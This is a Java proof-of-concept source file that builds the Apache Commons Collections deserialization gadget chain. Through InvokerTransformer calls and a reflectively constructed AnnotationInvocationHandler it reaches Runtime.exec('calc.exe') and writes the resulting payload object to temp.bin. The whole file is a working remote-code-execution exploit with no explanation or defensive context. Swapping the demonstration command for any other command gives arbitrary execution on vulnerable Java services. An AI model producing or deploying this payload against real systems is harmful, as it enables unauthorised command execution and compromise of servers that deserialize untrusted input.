package poc;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.TransformedMap;

public class Poc {

	public static void main(String[] args) throws Exception {
		Transformer[] transformers=new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod",new Class[] {
						String.class,Class[].class},new Object[] {
						"getRuntime",null
						}
				),
				new InvokerTransformer("invoke",new Class[] {
						Object.class,Object[].class},new Object[] {
						null,null
						}
				),
				new InvokerTransformer("exec",new Class[] {
						String.class},new Object[] {
						"calc.exe"
						}
				)
		};
		
		ChainedTransformer chain= new ChainedTransformer(transformers);
		
		Map innermap = new HashMap();
        innermap.put("key", "value");
        Map outmap = TransformedMap.decorate(innermap, null, chain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outmap);

        File f = new File("temp.bin");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
	}

}